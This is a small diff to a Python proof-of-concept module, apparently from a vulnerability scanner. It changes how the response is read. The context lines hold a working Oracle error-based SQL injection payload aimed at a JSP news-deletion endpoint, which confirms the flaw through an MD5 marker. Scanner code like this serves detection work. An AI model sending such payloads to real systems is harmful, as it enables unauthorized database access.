@@ -49,7 +49,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             payload = "/pub/m_pending_news/delete_pending_news.jsp?cbNewsId=1)%20and%201=ctxsys.drithsx.sn(1,(Utl_Raw.Cast_To_Raw(sys.dbms_obfuscation_toolkit.md5(input_string => '3.14'))))?"
             vul_url = arg + payload
-            response = requests.get(vul_url).content
+            response = requests.get(vul_url).text
             if '4beed3b9c4a886067de0e3a094246f78' in response:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
